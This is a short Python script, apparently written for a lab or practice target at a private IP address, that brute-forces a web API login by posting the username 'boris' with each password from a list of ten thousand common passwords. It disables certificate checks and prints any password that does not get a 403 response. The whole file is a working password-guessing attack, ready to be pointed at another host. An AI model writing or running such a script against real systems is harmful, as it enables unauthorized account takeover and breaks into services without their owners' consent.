import requests
#import json
#import os


# TO disable SSL Warnings use urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



with open("/opt/10k-most-common.txt", "r") as passwords:
	for password in passwords:
		password = password.strip()

		url = "https://10.150.150.48/api/tokens"

		headers = {  
			"Host": "10.150.150.48",
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
			"Accept": "application/json, text/plain, */*",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Content-Type": "application/x-www-form-urlencoded",
			"Content-Length": "30",
			"Origin": "https://10.150.150.48",
			"Connection": "close",
			"Referer": "https://10.150.150.48/"

			}
      
		data = "username=boris&password="+str(password)

		r = requests.post(url,headers=headers, data=data, verify=False)
		#print(type(r.status_code))
		if r.status_code != 403:
			print(password)

